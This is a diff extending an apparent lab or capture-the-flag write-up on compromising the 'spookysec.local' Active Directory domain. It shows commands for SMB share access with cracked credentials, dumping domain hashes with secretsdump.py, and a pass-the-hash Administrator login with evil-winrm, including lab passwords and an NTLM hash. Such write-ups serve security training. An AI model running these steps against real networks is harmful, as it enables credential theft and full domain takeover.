@@ -38,3 +38,22 @@ we also used hashcat:
 ```
 hashcat -m 18200 admin.hash passwordlist.txt
 ```
+With the password we attained we then logged into the smbclient and found a file with a base64 encoded message
+```
+smbclient -L <target ip> -U svc-admin
+```
+```
+smbclient \\\\<target ip>\\backup -U svc-admin
+```
+we decoded the hash with Cyberchef 
+and got the credentials for the user backup.
+
+afterwards we used secretsdump.py to dump the hashes for the users and attained the administrators hash
+```
+python3 secretsdump.py spookysec.local/backup:backup2517860@10.10.62.43
+```
+Then we logged in as the administrator with the hash using evil-wnrm.
+```
+evil-winrm -i 10.10.62.43 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+```
+We are now logged in as the Administrator with administrator priveldges and have fully compromised the directory; action is no longer required.
